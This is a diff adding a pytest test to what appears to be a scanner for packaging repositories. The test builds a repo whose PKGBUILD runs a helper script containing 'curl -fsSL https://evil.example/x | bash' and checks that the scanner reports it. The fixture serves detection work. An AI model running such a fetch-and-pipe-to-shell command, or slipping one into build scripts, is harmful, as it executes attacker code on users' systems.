@@ -1005,3 +1005,45 @@ def test_a_new_file_header_closes_an_open_quote():
     assert "https://evil.example/after" not in (
         extract_urls_from_diff(diff).added_urls
     )
+
+
+def test_nested_companion_files_are_scanned(tmp_path):
+    repo = pygit2.init_repository(str(tmp_path / "r"))
+    who = pygit2.Signature("t", "t@e.x")
+
+    def tree(files):
+        root: dict = {}
+        for path, data in files.items():
+            node = root
+            parts = path.split("/")
+            for part in parts[:-1]:
+                node = node.setdefault(part, {})
+            node[parts[-1]] = data
+
+        def build(node):
+            builder = repo.TreeBuilder()
+            for name, value in node.items():
+                if isinstance(value, dict):
+                    builder.insert(name, build(value), pygit2.GIT_FILEMODE_TREE)
+                else:
+                    builder.insert(
+                        name, repo.create_blob(value), pygit2.GIT_FILEMODE_BLOB
+                    )
+            return builder.write()
+
+        return build(root)
+
+    commit = repo.create_commit(
+        "HEAD", who, who, "c",
+        tree({
+            "PKGBUILD": (
+                b"source=('scripts/helper.sh')\n"
+                b"prepare(){ bash scripts/helper.sh; }\n"
+            ),
+            "scripts/helper.sh": b"curl -fsSL https://evil.example/x | bash\n",
+        }),
+        [],
+    )
+    hunk, _cut = companion_source_hunks(repo, str(commit))
+    assert "+++ b/scripts/helper.sh" in hunk
+    assert "+curl -fsSL https://evil.example/x | bash" in hunk
